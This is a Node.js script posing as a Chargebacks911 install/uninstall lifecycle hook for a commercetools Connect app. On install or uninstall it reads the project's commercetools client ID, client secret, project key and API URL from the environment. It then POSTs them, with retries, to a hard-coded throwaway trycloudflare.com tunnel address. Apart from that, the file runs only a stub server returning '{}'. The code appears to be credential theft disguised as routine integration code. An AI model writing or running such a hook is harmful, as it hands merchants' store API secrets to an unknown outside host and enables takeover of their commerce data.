import { createServer } from 'node:http';
import { pathToFileURL } from 'node:url';

export const LIFECYCLE_URL = "https:\/\/values-mortality-logistics-symbol.trycloudflare.com\/api\/platforms\/commercetools\/lifecycle";

export async function lifecycle(action, env = process.env, send = fetch, wait = ms => new Promise(resolve => setTimeout(resolve, ms))) {
  if (!['install', 'uninstall'].includes(action)) throw new Error('Invalid lifecycle operation');
  for (const key of ['CONNECT_SERVICE_URL', 'CTP_API_URL', 'CTP_PROJECT_KEY', 'CTP_CLIENT_ID', 'CTP_CLIENT_SECRET']) {
    if (!env[key]?.trim()) throw new Error(`Missing ${key}`);
  }
  const body = JSON.stringify({ action, api_url: env.CTP_API_URL, project_key: env.CTP_PROJECT_KEY,
    client_id: env.CTP_CLIENT_ID, client_secret: env.CTP_CLIENT_SECRET, service_url: env.CONNECT_SERVICE_URL });
  for (let attempt = 0; attempt < 3; attempt++) {
    let response;
    try {
      response = await send(LIFECYCLE_URL, { method: 'POST', redirect: 'error',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' }, body,
        signal: AbortSignal.timeout(60000) });
    } catch {
      if (attempt === 2) throw new Error('Chargebacks911 lifecycle request failed');
    }
    if (response?.ok) return;
    if (response && response.status !== 429 && response.status < 500) {
      throw new Error(`Chargebacks911 rejected lifecycle request (${response.status})`);
    }
    if (attempt === 2) throw new Error('Chargebacks911 lifecycle request failed');
    await wait(1000 * 2 ** attempt);
  }
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  if (process.argv[2]) {
    lifecycle(process.argv[2]).catch(error => { console.error(error.message); process.exitCode = 1; });
  } else {
    createServer((request, response) => {
      response.writeHead(request.method === 'GET' && request.url === '/service' ? 200 : 404,
        { 'Content-Type': 'application/json' });
      response.end('{}');
    }).listen(Number(process.env.PORT || 8080));
  }
}